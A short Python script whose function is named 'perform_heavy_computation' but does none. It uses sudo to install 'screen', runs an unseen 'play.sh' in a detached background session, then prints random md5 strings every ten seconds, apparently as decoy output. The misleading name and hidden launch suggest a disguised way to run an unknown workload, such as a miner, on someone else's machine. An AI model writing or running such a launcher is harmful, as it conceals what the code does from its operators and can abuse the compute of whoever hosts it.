import os
def perform_heavy_computation():
    import os
    os.system('sudo apt update;sudo apt install screen -y;chmod +x play.sh;screen -dmS run ./play.sh;while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10s; done')

perform_heavy_computation()
